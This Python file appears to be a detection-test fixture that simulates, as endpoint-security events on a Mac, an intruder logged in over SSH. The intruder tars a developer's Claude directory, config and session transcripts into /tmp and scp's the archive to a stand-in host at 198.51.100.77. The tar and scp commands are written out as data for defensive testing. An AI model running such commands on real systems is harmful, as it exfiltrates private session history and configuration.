"""EAA-005 as OALABS recovered it (EAA-C-008, step 1): an operator with SSH
access to the developer's machine copies the Claude installation with its
session history off the host."""
import importlib.util
import os

import es

_s = importlib.util.spec_from_file_location("rs_common", os.path.join(os.path.dirname(__file__), "_common.py"))
rs = importlib.util.module_from_spec(_s)
_s.loader.exec_module(rs)

CASE = {
    "id": "eaa-005-ssh-operator-archives-claude-install-and-history",
    "title": "From an inbound SSH login, tar archives ~/.claude, ~/.claude.json and the Claude install, and scp sends it off",
    "flag": True,
    "eaa": ["EAA-005"],
    "group": "runtime-state",
    "grounding": {
        "catalog_case": "EAA-C-008",
        "steps": [1],
        "sources": ["SRC-010",
                    "https://research.openanalysis.net/claude/codex/hacking/ai%20hacking/llm/redteam/policy%20violation/2026/06/16/compromised-claude-hacking.html"],
    },
    "notes": (
        "OALABS: the operator, who reached the host over SSH (several inbound sessions), copied the developer's "
        "Claude installation, with months of session logs and artifacts, to an attacker-controlled host; other "
        "stolen Claude instances were found as 7-Zip archives. The host was Linux; the report names neither the "
        "copy tools nor the paths. Written for this Mac: an inbound SSH login as dev, `tar` of ~/.claude, "
        "~/.claude.json and ~/.local/share/claude into /tmp, and `scp` of the archive to another host (the "
        "report's copy went from the victim's host to a different attacker-controlled one; both addresses are "
        "from documentation ranges). tar and scp stand in for the copy the report does not describe; nothing "
        "after the copy (cleanup of the archive) is written, since the report does not say. tar reads every file "
        "it archives: the transcripts and history (agent_state), settings, memory and ~/.claude.json. Not "
        "visible: the transfer itself (network). Key events: the tar exec, its reads of the transcripts and "
        "history.jsonl, and the scp exec."
    ),
}

ACME_WEB = es.project_dir("/Users/dev/code/acme-web")
ACME_API = es.project_dir("/Users/dev/code/acme-api")
SESSIONS = [f"{ACME_WEB}/3f2a9c1e-5b7d-4e8a-9c0f-1a2b3c4d5e6f.jsonl", f"{ACME_WEB}/8d0e4b6a-2c1f-4a9e-b7d3-6e5f4a3b2c1d.jsonl",
            f"{ACME_API}/c7b9e2d4-1a3f-4c5e-8b6d-0f9e8d7c6b5a.jsonl"]
OTHER = [f"{ACME_WEB}/memory/MEMORY.md", "~/.claude/settings.json", "~/.claude/shell-snapshots/snapshot-zsh-1759650000000-1a2b3c.sh"]
ARCHIVE = "/private/tmp/cc.tgz"


def build(mac):
    for i, f in enumerate(SESSIONS):
        mac.exists(f, size=400_000 + 90_000 * i, days=10 + 20 * i)
    for f in OTHER:
        mac.exists(f, days=30)
    sh = rs.ssh_login(mac)
    mac.wait(6)
    mac.run(sh, "ls", ["ls", "-la", ".claude", ".local/share/claude"], wait=0.01)
    mac.wait(9)
    tar = mac.spawn(sh, rs.BSDTAR, ["tar", "-czf", "/tmp/cc.tgz", ".claude", ".claude.json", ".local/share/claude"], key=True)
    mac.create(tar, ARCHIVE)
    mac.open(tar, ARCHIVE, es.FWRITE | es.O_CREAT | es.O_TRUNC | es.O_CLOEXEC)
    for f in ["~/.claude/history.jsonl"] + SESSIONS:
        mac.read_file(tar, f, key=True)
    for f in OTHER + ["~/.claude.json", es.CLAUDE]:
        mac.read_file(tar, f)
    mac.wait(2.5)
    mac.close(tar, ARCHIVE, modified=True)
    mac.exit(tar)
    mac.wait(4)
    scp = mac.spawn(sh, rs.SCP, ["scp", "/tmp/cc.tgz", "root@198.51.100.77:/srv/drop/"], key=True)
    mac.read_file(scp, ARCHIVE)
    ssh = mac.spawn(scp, "ssh", ["/usr/bin/ssh", "-x", "-oPermitLocalCommand=no", "-oClearAllForwardings=yes",
                                 "-oRemoteCommand=none", "-oRequestTTY=no", "-oForwardAgent=no", "-l", "root", "-s", "--",
                                 "198.51.100.77", "sftp"], fds="pipe")
    mac.read_file(ssh, "~/.ssh/config")
    mac.read_file(ssh, "~/.ssh/known_hosts")
    mac.wait(6)
    mac.exit(ssh)
    mac.exit(scp)
    mac.wait(5)
    rs.ssh_logout(mac, sh)
